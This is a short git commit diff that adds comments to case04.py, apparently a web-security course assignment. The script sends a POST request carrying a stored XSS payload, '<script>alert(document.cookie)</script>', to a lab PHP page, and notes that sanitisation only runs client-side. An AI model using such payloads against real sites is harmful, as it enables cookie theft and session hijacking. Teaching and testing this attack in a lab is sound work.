b4c8b7f38fb397ea12b57d1b2591026385b7c4e8
garbanzos <yiyant@gmail.com>
2018-03-18 16:52:45 +0800

    added some comments to case 4

--- case04.py
+++ case04.py
@@ -1,6 +1,10 @@
 import requests
 import webbrowser
 
+# Exploit: post request with script, the sanitise function is bypassed since it
+# only sanitises on click of the submit button
+# Persistent XSS
+
 def main():
     url = 'http://wsb.com/Assignment2/case04.php'
     payload = {'title':'Exploit', 'content':'<script>alert(document.cookie)</script>'}
